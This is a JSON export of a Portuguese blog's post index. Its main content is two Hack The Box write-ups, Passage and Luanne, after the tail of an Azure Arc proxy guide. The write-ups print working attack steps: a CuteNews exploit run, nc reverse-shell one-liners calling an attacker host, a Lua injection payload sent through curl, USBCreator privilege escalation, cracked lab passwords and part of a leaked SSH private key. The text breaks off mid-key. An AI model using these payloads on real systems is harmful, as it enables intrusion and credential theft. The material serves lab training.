mencionados, basta executar os comandos a seguir para realizar o reinício do systemd e reiniciar as dependências do Arc:       sudo systemctl daemon-reexec sudo systemctl restart extd.service himdsd.service gcad.service                Adicionalmente é necessário incluir o proxy no wrapper azcmagent para que o commando azcmagent connect funcione corretamente na máquina. Esta ação se dá a partir da inclusão da linha export https_proxy=&lt;proxyserver&gt; logo abaixo do comentário de que não se deve apagar a linha no arquivo /opt/azcmagent/bin/azcmagent, conforme exemplo abaixo:       [...]    # Do not remove this line ==== place Environment Variables below ====== export https_proxy=http://vmlx01:3128    [...]           Após estas alterações, você deverá ver a seguinte entrada nos arquivos de log, que comprovam que o serviço está funcionando corretamente e utilizando o proxy recém definido. O Log pode ser validado em /var/opt/azcmagent/log/himds.log   time=\"yyyy-MM-dd02T17:34:07Z\" level=debug msg=\"Using Https Proxy: http://vmlx01:3128\"   A partir deste ponto você estará preparando para gerenciar este endpoint com o Azure Arc ou conectá-lo ao serviço utilizando o comando azcmagent connect caso seja uma nova instalação.   Script   Para simplificar a configuração, criei um script inspirado no azcmagent_proxy para automatizar esta configuração para distribuições Linux que utilizem o systemd, disponível em  Security/azcmagent_proxydaemon.sh at main · davi-cruz/Security (github.com).   Este script pode ser útil não apenas para definir as configurações de proxy para os servidores Linux habilitados com Azure Arc mas também para outros service unities em seus workloads. :smile:   :warning: Atenção: Como estas alterações não são globais, outros serviços instalados a partir de Azure Extensions (Nativas ou Customizadas) podem requerer alterações adicionais para que funcionem com o proxy padrão ou a mesma configuração deverá ser reproduzida para estes serviços   Espero que ajude!  ","categories": ["Azure Arc"],
        "tags": ["Azure","Arc","Linux"],
        "url": "https://davicruz.com/azure-arc/2021/03/azure-arc-enabled-servers-service-level-proxy-configuration-on-linux/",
        "teaser": "https://davicruz.com/assets/images/teaser.png"
      },{
        "title": "Hackthebox write-up: Passage",
        "excerpt":"Olá pessoal!   A máquina desta semana será Passage, outra máquina Linux classificada como mediana do Hack The Box criada por ChefByzen.   :information_source: Info: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas      Enumeração   Iniciado, como de costume, executando um scan rápido com nmap para verificar o que se encontra em execução nesta máquina   $ nmap -sC -sV -Pn -oA quick 10.10.10.206 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-25 12:58 -03 Nmap scan report for 10.10.10.206 Host is up (0.077s latency). Not shown: 998 closed ports PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA) |   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA) |_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519) 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Passage News Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 10.65 seconds   80/TCP - Serviço HTTP   Acessando a página notado que se trata de um blog criado com CuteNews e o primeiro post continha algo bastante interessante, mencionando que Fail2Ban foi recentemente implementado no site. Isso irá nos impedir de utilizar qualquer ferramenta de enumeração que utilize brute force (como dirbuster e outras ferramentas/técnicas relacionadas).      Inspecionando o código fonte da página, enquanto buscava por links interessantes, encontrei alguns endereços e-mail, além do domínio passage.htb, o qual foi adicionado na sequência no arquivo hosts local.   $ curl -L http://10.10.10.206 | grep -Eo 'href=\"(.*)\"' | grep -v 'index.php' | sort -u   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                  Dload  Upload   Total   Spent    Left  Speed 100 11085    0 11085    0     0  68006      0 --:--:-- --:--:-- --:--:-- 68006 href=\"CuteNews/libs/css/cosmo.min.css\" rel=\"stylesheet\" href=\"CuteNews/libs/css/font-awesome.min.css\" rel=\"stylesheet\" href=\"CuteNews/rss.php\"&gt;&lt;img src=\"CuteNews/skins/images/rss_icon.gif\" alt=\"RSS\" href=\"http://cutephp.com/\" title=\"CuteNews - PHP News Management System\" style=\"font:9px Verdana!important;display:inline!important;visibility:visible!important;color:#003366!important;text-indent: 0px!important;\" href=\"mailto:kim@example.com\" href=\"mailto:nadav@passage.htb\" href=\"mailto:paul@passage.htb\" href=\"mailto:sid@example.com\"   Após alguma pesquisa sobre o produto, encontrei a página de administração em http://passage.htb/CuteNews, onde pude identificar a versão em execução 2.1.2.      Acesso inicial   Verificando os exploits existentes para esta versão do produto, encontrei 4 alternativas usando o searchsploit onde acabei utilizando a versão 48800, na qual fiz alguns ajustes posteriormente.   searchsploit cutenews 2.1.2 ---------------------------------------------------------------------- ---------------------------------  Exploit Title                                                        |  Path ---------------------------------------------------------------------- --------------------------------- CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)          | php/remote/46698.rb CuteNews 2.1.2 - Arbitrary File Deletion                              | php/webapps/48447.txt CuteNews 2.1.2 - Authenticated Arbitrary File Upload                  | php/webapps/48458.txt CuteNews 2.1.2 - Remote Code Execution                                | php/webapps/48800.py ---------------------------------------------------------------------- --------------------------------- Shellcodes: No Results   A partir da execução deste exploit não apenas pude obter uma execução remota de código mas também um dump dos hashes das senhas do portal.   $ python3 48800.py               _____     __      _  __                     ___   ___  ___            / ___/_ __/ /____ / |/ /__ _    _____       |_  | &lt;  / |_  |          / /__/ // / __/ -_)    / -_) |/|/ (_-&lt;      / __/_ / / / __/           \\___/\\_,_/\\__/\\__/_/|_/\\__/|__,__/___/     /____(_)_(_)____/                                  ___  _________                                                        / _ \\/ ___/ __/                                                       / , _/ /__/ _/                                                        /_/|_|\\___/___/                                                                                                                                                                                                                                                        [-&gt;] Usage python3 expoit.py  Enter the URL&gt; http://passage.htb ================================================================ Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN ================================================================ 7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1 4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88 e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca 4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc ================================================================  ============================= Registering a users ============================= [+] Registration successful with username: T6iejum4p0 and password: T6iejum4p0  ======================================================= Sending Payload ======================================================= signature_key: 93cc9868982b197fd95de590c77cf9b9-T6iejum4p0 signature_dsi: 4afbd01426014d57617027ee835dc2ad logged in user: T6iejum4p0 ============================ Dropping to a SHELL ============================  command &gt;    Crackeando os hashes utilizando John, encontrei a senha atlanta1, que pertence ao usuário paul, o qual foi identificado após a edição do script Python conforme abaixo.   Enter the URL&gt; http://passage.htb ================================================================ Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN ================================================================ paul@passage.htb:e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd   $ john -format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hashes Created directory: /home/zurc/.john Using default input encoding: UTF-8 Loaded 4 password hashes with no different salts (Raw-SHA256 [SHA256 256/256 AVX2 8x]) Warning: poor OpenMP scalability for this hash type, consider --fork=2 Will run 2 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status atlanta1         (?) 1g 0:00:00:02 DONE (2021-02-25 16:02) 0.4132g/s 5926Kp/s 5926Kc/s 17794KC/s (454579)..*7¡Vamos! Use the \"--show --format=Raw-SHA256\" options to display all of the cracked passwords reliably Session completed   Além da credencial, obtive um shell reverso interativo com a conta www-data a partir do envio do payload a seguir: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f.   User flag   Após executar o script linpeas.sh, encontrei alguns itens interessantes:           Máquina é vulnerável a USBCreator       [+] USBCreator [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation Vulnerable!!           Embora seja vulnerável, quando tentei explorá-la conforme explicado neste link, não funcionou corretamente dado a privilégios insuficientes deste usuário.       www-data@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/somefilename true Error: GDBus.Error:org.freedesktop.DBus.Python.dbus.exceptions.DBusException: com.ubuntu.USBCreator.Error.NotAuthorized (According to introspection data, you need to pass 'ssb')                Observado 2 usuários na máquina, que inicialmente foram listados quando encontrei os endereços de e-mail e, para o usuário Paul, já temos uma possível senha.       [+] Users with console nadav:x:1000:1000:Nadav,,,:/home/nadav:/bin/bash paul:x:1001:1001:Paul Coles,,,:/home/paul:/bin/bash root:x:0:0:root:/root:/bin/bash                Permissões para os usuários de console listados, onde nadav é o que possui mais privilégios na máquina, sendo inclusive membro do grupo sudo.       [+] All users &amp; groups uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare) uid=1001(paul) gid=1001(paul) groups=1001(paul)           Primeira coisa a ser testada a seguir foram as credenciais do usuário Paul, que funcionaram com sucesso na primeira tentativa e nos permitiram obter a flag de usuário! :smile:   www-data@passage:~$ su paul Password: paul@passage:~$ cat user.txt &lt;redacted&gt; paul@passage:~$   Root flag   Ao obter a conta do usuário paul, foi testada novamente a exploração do USB-Creator, porém falhou do mesmo modo que o usuário www-data devido a privilégios insuficientes.   Analisando o diretório raiz do usuário, encontado um par de chaves RSA, a qual está inclusa no arquivo authorized_keys para conexão ssh sem credenciais.   paul@passage:~/.ssh$ ls -la total 24 drwxr-xr-x  2 paul paul 4096 Jul 21  2020 . drwxr-x--- 16 paul paul 4096 Feb  5 06:30 .. -rw-r--r--  1 paul paul  395 Jul 21  2020 authorized_keys -rw-------  1 paul paul 1679 Jul 21  2020 id_rsa -rw-r--r--  1 paul paul  395 Jul 21  2020 id_rsa.pub -rw-r--r--  1 paul paul 1312 Jul 21  2020 known_hosts   Dando uma olhada mais de perto no arquivo id_rsa.pub, notei que ele foi criado pelo usuário nadav. Uma vez que vi esta informação, imediatamente tentei conectar via ssh com esta chave para o usuário nadav e por sorte tivemos sucesso! :smiley:   $ cat id_rsa.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage  $ ssh -i id_rsa nadav@10.10.10.206 Last login: Thu Feb 25 13:41:27 2021 from 10.10.10.10 nadav@passage:~$ id uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)   Finalmente, como o usuário nadav, fiz uma última tentativa da exploração da vulnerabilidade do USBCreator. Desta vez tivemos sucesso, uma vez que este usuário possui diversos privilégios nesta máquina.   O exploit do USBCreator nos permite copiar um arquivo usando os privilégios de root. Se quiser apenas copiar o arquivo root.txt para o diretório /tmp, a linha de comando abaixo atende a esta necessidade.   nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/somefilename true   Porém, se quiser um shell interativo com privilégios de root, existem algumas possibilidades que devemos tentar:      Obter uma cópia do /etc/shadow, fazer o unshadow e crackear a senha utilizando John ou Hashcat, o que não funcionou com o dicionário que utilizei;   Verificar a existência de um arquivo id_rsa no perfil do root, assim como sua configuração como uma chave autorizada no arquivo authorized_keys, que foi onde obtivemos sucesso e pudemos ver a flag desta conta.   nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/somefilename true  ## Attacker machine $ scp -i id_rsa nadav@10.10.10.206:/tmp/somefilename . $ chmod +600 id_rsa $ ssh -i root@10.10.10.206 root@passage:~# id uid=0(root) gid=0(root) groups=0(root) root@passage:~# cat /root/root.txt &lt;redacted&gt;   Espero que tenham gostado.   Até o próximo post! :smiley:  ","categories": ["Writeup"],
        "tags": ["HackTheBox","htb-medium","htb-linux"],
        "url": "https://davicruz.com/writeup/2021/03/htb-passage/",
        "teaser": "https://i.imgur.com/Oxk4R89.png"
      },{
        "title": "Hackthebox write-up: Luanne",
        "excerpt":"Olá pessoal!   A máquina desta semana será Luanne, outra máquina Linux classificada como fácil do Hack The Box, , criada por polarbearer.   :information_source: Info: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas      Enumeração   Iniciado enumeração, como de costume, executando um scan rápido com o nmap para identificar os serviços publicados:   $ nmap -sC -sV -Pn -oA quick 10.10.10.218 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-19 13:35 -03 Nmap scan report for 10.10.10.218 Host is up (0.15s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0) | ssh-hostkey: | 3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA) | 521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA) |_ 256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519) 80/tcp open http nginx 1.19.0 | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=. | http-robots.txt: 1 disallowed entry |_/weather |_http-server-header: nginx/1.19.0 |_http-title: 401 Unauthorized 9001/tcp open http Medusa httpd 1.12 (Supervisor process manager) | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=default |_http-server-header: Medusa/1.12 |_http-title: Error response Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 208.02 seconds   80/TCP - Serviço HTTP   Ao acessar a página inicial do serviço foi solicitada autenticação, para a qual não temos nenhum tipo de credencial até o momento. Um ponto que chama a atenção é o link para a porta 3000/TCP do localhost, sendo que estamos acessando de uma porta 80/TCP, provavelmente através de um proxy.      De acordo com o scan do nmap, existe uma entrada no arquivo robots.txt. Ao validá-lo integralmente encontramos uma informação importante sobre um diretório virtual /weather   $ curl -L http://10.10.10.218/robots.txt User-agent: * Disallow: /weather #returning 404 but still harvesting cities   Com este dado podemos inferir que, mesmo com os errors 404, ainda deve existir algum serviço onde possamos realizar as consultas a respeito do tempo.   Gobuster   Executando o gobuster em modo diretório, pude identificar o caminho forecast, que foi chave para conseguirmos prosseguir nesta máquina:   $ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.218/weather/ -o gosbuter-80-weather.txt -t 50 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.218/weather/ [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2021/02/19 14:50:37 Starting gobuster =============================================================== /forecast (Status: 200) Progress: 68993 / 220561 (31.28%)   Em uma chamada utilizando o curl faltando parámetros, recebemos um “manual” de como utilizar a API, onde temos a opção de listar o clima pra cidades específicas implementadas.   $ curl -L http://10.10.10.218/weather/forecast {\"code\": 200, \"message\": \"No city specified. Use 'city=list' to list available cities.\"} $ curl -L http://10.10.10.218/weather/forecast?city=list {\"code\": 200,\"cities\": [\"London\",\"Manchester\",\"Birmingham\",\"Leeds\",\"Glasgow\",\"Southampton\",\"Liverpool\",\"Newcastle\",\"Nottingham\",\"Sheffield\",\"Bristol\",\"Belfast\",\"Leicester\"]}    $ curl -L http://10.10.10.218/weather/forecast?city=London {\"code\": 200,\"city\": \"London\",\"list\": [{\"date\": \"2021-02-19\",\"weather\": {\"description\": \"snowy\",\"temperature\": {\"min\": \"12\",\"max\": \"46\"},\"pressure\": \"1799\",\"humidity\": \"92\",\"wind\": {\"speed\": \"2.1975513692014\",\"degree\": \"102.76822959445\"}}},{\"date\": \"2021-02-20\",\"weather\": {\"description\": \"partially cloudy\",\"temperature\": {\"min\": \"15\",\"max\": \"43\"},\"pressure\": \"1365\",\"humidity\": \"51\",\"wind\": {\"speed\": \"4.9522297247313\",\"degree\": \"262.63571172766\"}}},{\"date\": \"2021-02-21\",\"weather\": {\"description\": \"sunny\",\"temperature\": {\"min\": \"19\",\"max\": \"30\"},\"pressure\": \"1243\",\"humidity\": \"13\",\"wind\": {\"speed\": \"1.8041767538525\",\"degree\": \"48.400944394059\"}}},{\"date\": \"2021-02-22\",\"weather\": {\"description\": \"sunny\",\"temperature\": {\"min\": \"30\",\"max\": \"34\"},\"pressure\": \"1513\",\"humidity\": \"84\",\"wind\": {\"speed\": \"2.6126398323104\",\"degree\": \"191.63755226741\"}}},{\"date\": \"2021-02-23\",\"weather\": {\"description\": \"partially cloudy\",\"temperature\": {\"min\": \"30\",\"max\": \"36\"},\"pressure\": \"1772\",\"humidity\": \"53\",\"wind\": {\"speed\": \"2.7699138359167\",\"degree\": \"104.89152945159\"}}}]}   Embora seja possível consultar as informações nesta API, não consegui identificar nenhum detalhe adicional de como converter essa API de consulta para alguma execução remota de código e decidi seguir para o próximo serviço disponível nesta máquina.   9001/TCP - Serviço HTTP   Buscando por Medusa httpd 1.12 (Supervisor process manager) encontrei que o serviço provavelmente se trata da aplicação Supervisor. Buscando pelas credenciais padrão na página do projeto encontrei user:123, as quais permitiram o acesso no portal e exibiu a página abaixo:      Com isso podemos observar que a versão do supervisor em execução é  a 4.2.0, que em uma busca rápida não retornou nenhuma vulnerabilidade conhecida.   Clicando em cada um dos recursos disponíveis, um item interessante chamou atenção: o link processes. Ao acessar as informações ali disponíveis um processo em execução na máquina chamou atenção, frente ao que identificamos no item anterior:   _httpd 376 0.0 0.0 34956 2020 ? Is 5:56AM 0:00.13 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www   Pelo que pudemos identificar a API que estivemos consultando a pouco publicada na porta 80/TCP se trata de um aplicativo desenvolvido em LUA, uma linguagem de programação desenvolvida pela Universidade PUC-RJ.   Acesso inicial   Uma vez que sabemos que a API é desenvolvida em LUA, após algumas pesquisas, encontrei este artigo que descreve algumas formas de explorar aplicações escritas em LUA a partir de code injection e, após alguns testes, consegui algo que poderia nos levar a um acesso inicial nesta máquina.   :bulb: Note: O segredo está na codificação do conteúdo passado nos requests, logo, a forma mais simples encontrada foi utilizar o próprio curl com alguns parâmetros conforme listado abaixo, simplificando o processo de escaping dos caracteres utilizados no payload.:   A injeção final, que permitiu execução remota de código na máquina foi o resultado abaixo:   $ curl -G --data-urlencode \"city=London') os.execute('ls -la') x=('\" http://10.10.10.218/weather/forecast {\"code\": 500,\"error\": \"unknown city: Londontotal 20 drwxr-xr-x 2 root wheel 512 Nov 25 11:27 . drwxr-xr-x 24 root wheel 512 Nov 24 09:55 .. -rw-r--r-- 1 root wheel 47 Sep 16 15:07 .htpasswd -rw-r--r-- 1 root wheel 386 Sep 17 20:56 index.html -rw-r--r-- 1 root wheel 78 Nov 25 11:38 robots.txt   A partir desta execução consegui ler o arquivo .htpasswd, que possui o hash da senha para acesso ao website que, utilizando o john, consegui crackeá-la a usando o dicionário rockyou.txt.   $ cat .htpasswd webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0    $ john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long .htpasswd Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64]) Will run 2 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status iamthebest (webapi_user) 1g 0:00:00:00 DONE (2021-02-19 17:09) 3.571g/s 10628p/s 10628c/s 10628C/s sexy..14789632 Use the \"--show\" option to display all of the cracked passwords reliably Session completed   Para obter um shell reverso, executei a seguinte chamada HTTP:    curl -G --data-urlencode \"city=London') os.execute('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 1234 &gt;/tmp/f') x=('\" http://10.10.10.218/weather/forecast    User flag   Ao executar o linpeas.sh observado que o usuário r.michaels possui em execução a mesma web API LUA utilizada no acesso inicial. A ideia seria obter um shell reverso com a conta do usuário em questão da mesma forma que o acesso inicial foi obtido, porém a exploração utilizada anteriormente não funcionou conforme esperado. Isso nos leva a crer que esta versão da API foi corrigida, conforme podemos notar também o path devel no caminho do arquivo weather.lua em execução na chamada.   r.michaels 185 0.0 0.0 34992 1964 ? Is 5:56AM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www   bozohttpd   Um ponto que estava passando desapercebido até então é que embora acessássemos a aplicação na porta 80/TCP, ela estava publicada na porta 3000/TCP local. Isso implica que algum proxy estava sendo utilizado para a sua publicação. Esta informação foi confirmada ao validar o cabeçalho da resposta recebida em um request diretamente por dentro da máquina:   curl -I http://127.0.0.1:3000 % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 199 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0 HTTP/1.1 401 Unauthorized WWW-Authenticate: Basic realm=\".\" Content-Type: text/html Content-Length: 199 Server: bozohttpd/20190228 Allow: GET, HEAD, POST   Pesquisando sobre o bozohttpd, o servidor utilizado para esta publicação, encontrei esta man page que descreve uma das suas features: ~user translation, que permite acessar diretórios virtuais dos usuários através de chamada do tipo http://&lt;server&gt;/~&lt;username&gt;. Iss foi confirmado a partir da seguinte chaada utilizando o curl:   curl http://127.0.0.1:3000/~r.michaels -u webapi_user Enter host password for user 'webapi_user':iamthebest    % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 172 0 172 0 0 86000 0 --:--:-- --:--:-- --:--:-- 86000 &lt;html&gt;&lt;head&gt;&lt;title&gt;Document Moved&lt;/title&gt;&lt;/head&gt; &lt;body&gt;&lt;h1&gt;Document Moved&lt;/h1&gt; This document had moved &lt;a href=\"http://127.0.0.1:3000/~r.michaels/\"&gt;here&lt;/a&gt; &lt;/body&gt;&lt;/html&gt;   Entretanto, uma vez que a instância na porta 3000 roda com a conta _httpd, não temos permissão neste diretório, mas como notamos que existe uma outra instancia na porta 3001 em execução pelo usuário r.michaels, pudemos obter o seguinte resultado, onde vemos a existência de um aquivo chamado id_rsa   curl http://127.0.0.1:3001/~r.michaels/id_rsa -u webapi_user Enter host password for user 'webapi_user':iamthebest  % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 601 0 601 0 0 293k 0 --:--:-- --:--:-- --:--:-- 586k &lt;!DOCTYPE html&gt; &lt;html&gt;&lt;head&gt;&lt;meta charset=\"utf-8\"/&gt; &lt;style type=\"text/css\"&gt; table { border-top: 1px solid black; border-bottom: 1px solid black; } th { background: aquamarine; } tr:nth-child(even) { background: lavender; } &lt;/style&gt; &lt;title&gt;Index of ~r.michaels/&lt;/title&gt;&lt;/head&gt; &lt;body&gt;&lt;h1&gt;Index of ~r.michaels/&lt;/h1&gt; &lt;table cols=3&gt; &lt;thead&gt; &lt;tr&gt;&lt;th&gt;Name&lt;th&gt;Last modified&lt;th align=right&gt;Size &lt;tbody&gt; &lt;tr&gt;&lt;td&gt;&lt;a href=\"../\"&gt;Parent Directory&lt;/a&gt;&lt;td&gt;16-Sep-2020 18:20&lt;td align=right&gt;1kB &lt;tr&gt;&lt;td&gt;&lt;a href=\"id_rsa\"&gt;id_rsa&lt;/a&gt;&lt;td&gt;16-Sep-2020 16:52&lt;td align=right&gt;3kB &lt;/table&gt; &lt;/body&gt;&lt;/html&gt;   Ao baixar este arquivo, notamos que se trata de uma chave OpenSSH,  a qual possivelmente nos permitirá logar com a conta r.michaels e obter a flag do usuário.   curl http://127.0.0.1:3001/~r.michaels/id_rsa -u webapi_user Enter host password for user 'webapi_user':iamthebest  % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 2610 100 2610 0 0 2548k 0 --:--:-- --:--:-- --:--:-- 2548k -----BEGIN OPENSSH PRIVATE KEY----- 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 